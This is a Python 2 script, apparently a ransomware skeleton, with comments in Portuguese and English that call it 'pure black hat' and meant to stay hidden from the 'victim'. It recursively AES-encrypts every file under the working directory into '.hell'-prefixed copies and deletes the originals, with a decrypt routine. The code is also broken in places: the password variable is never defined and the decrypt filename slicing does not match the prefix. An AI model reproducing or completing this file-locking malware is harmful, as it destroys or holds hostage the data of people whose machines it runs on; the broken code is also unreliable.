#!/usr/bin/env python
# -* coding: utf-8 -*-

# this is a  crytp/desencrypt software
# written in pure python
# BORN TO CODE 

# MELHORIAS SÃO BEM VINDAS.
# ISSO É UM ESQUELETO.
# mrx
# madrugada é para codar. 
#
#
# the world is a secure place, trust in this...
# written in pure python
# educational porpuoses only. for sure. 
# this is pure black hat, and how to defend ourself of this kinda of attack. 
# the code will be intuctive to the attacker and hidden to  the 'victim'. 
# flying_bird.py flying like a bird 
# lol
# tryng some py2exe 
# or some fisic acess
# or do it in your lab : - )
# i don't care... really 
# echo 
# echo
# echo $LetsMoveOnKiddon$


# so, the first thing is import the modules.
# all knowllegd for us. 
# so, lets move on, kiddon. - Mr Robot referencie. in the case of someone don't know.lol 

from Crypto.Hash import SHA256
from Crypto.Cipher import AES
import os, random, sys, pkg_resources

# defina a criptografia - optei pela AES
def encrypt(key, filename):
        chunksize = 64 * 1024
        outFile = os.path.join(os.path.dirname(filename), ".hell"+os.path.basename(filename))
        filesize = str(os.path.getsize(filename)).zfill(16)
        IV = ''
 
        for i in range(16):
                IV += chr(random.randint(0, 0xFF))
       
        encryptor = AES.new(key, AES.MODE_CBC, IV)
 
        with open(filename, "rb") as infile:
                with open(outFile, "wb") as outfile:
                        outfile.write(filesize)
                        outfile.write(IV)
                        while True:
                                chunk = infile.read(chunksize)
                               
                                if len(chunk) == 0:
                                        break
 
                                elif len(chunk) % 16 !=0:
                                        chunk += ' ' *  (16 - (len(chunk) % 16))
 
                                outfile.write(encryptor.encrypt(chunk))
 
 
def decrypt(key, filename):
        outFile = os.path.join(os.path.dirname(filename), os.path.basename(filename[11:]))
        chunksize = 64 * 1024
        with open(filename, "rb") as infile:
                filesize = infile.read(16)
                IV = infile.read(16)
 
                decryptor = AES.new(key, AES.MODE_CBC, IV)
               
                with open(outFile, "wb") as outfile:
                        while 1:
                                chunk = infile.read(chunksize)
                                if len(chunk) == 0:
                                        break
 
                                outfile.write(decryptor.decrypt(chunk))
 
                        outfile.truncate(int(filesize))
       
def allfiles():
        allFiles = []
        for root, subfiles, files in os.walk(os.getcwd()):
                for names in files:
                        allFiles.append(os.path.join(root, names))
 
        return allFiles
    
choice = raw_input("Do you want to (E)ncrypt or (D)ecrypt? ")

encFiles = allfiles()
 
if choice == "E":
        for Tfiles in encFiles:
                if os.path.basename(Tfiles).startswith(".hell"):
                        print "%s is already encrypted" %str(Tfiles)
                        pass
 
                elif Tfiles == os.path.join(os.getcwd(), sys.argv[0]):
                        pass
                else:
                        encrypt(SHA256.new(password).digest(), str(Tfiles))
                        print "Done encrypting %s" %str(Tfiles)
                        os.remove(Tfiles)
 
elif choice == "D":
        filename = raw_input("Enter the filename to decrypt: ")
        if not os.path.exists(filename):
                print "The file does not exist"
                sys.exit(0)
        elif not filename.startswith(".hell"):
                print "%s is already not encrypted" %filename
                sys.exit()
        else:
                decrypt(SHA256.new(password).digest(), filename)
                
                print "Done decrypting %s" %filename
                
                os.remove(filename) 
 
else:
        print "Please choose a valid command."
        sys.exit()

## bugs em relação a senha, e loop do programa. 
